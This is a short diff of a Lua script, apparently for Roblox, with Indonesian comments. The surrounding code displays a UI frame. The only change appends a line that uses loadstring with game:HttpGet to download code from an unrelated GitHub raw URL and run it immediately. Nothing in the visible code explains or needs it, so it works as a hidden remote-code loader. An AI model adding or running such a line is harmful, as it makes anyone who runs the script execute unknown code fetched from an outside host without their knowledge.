@@ -265,3 +265,4 @@ byText.Parent = frame -- Jadikan teks sebagai anak dari frame
 
 -- Tampilkan frame
 ToggleFrame(true)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefbymeind2/main/gefidk"))()
